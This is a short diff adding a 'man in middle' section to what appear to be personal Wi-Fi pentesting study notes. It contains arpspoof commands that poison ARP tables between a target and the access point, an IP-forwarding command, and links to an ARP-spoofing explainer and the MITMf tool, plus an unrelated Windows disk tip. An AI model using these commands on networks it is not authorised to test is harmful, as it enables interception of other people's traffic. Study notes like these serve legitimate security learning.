@@ -802,3 +802,20 @@ aircrack-ng test1.cap -w wordlist
 
 
 ## post connection attack
+
+### man in middle
+
+arpspoof -i <interface> -t <target_IP> <AP_IP>
+arpspoof -i <interface> -t  <AP_IP> <target_IP>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arp -a
+
+局域网 ARP 欺骗原理详解
+https://segmentfault.com/a/1190000009562333
+
+google mitmf github
+https://github.com/byt3bl33d3r/MITMf
+
+Win10 C盘扩容？试试这两种方法！
+https://www.disktool.cn/content-center/extend-volume-c-with-ease.html
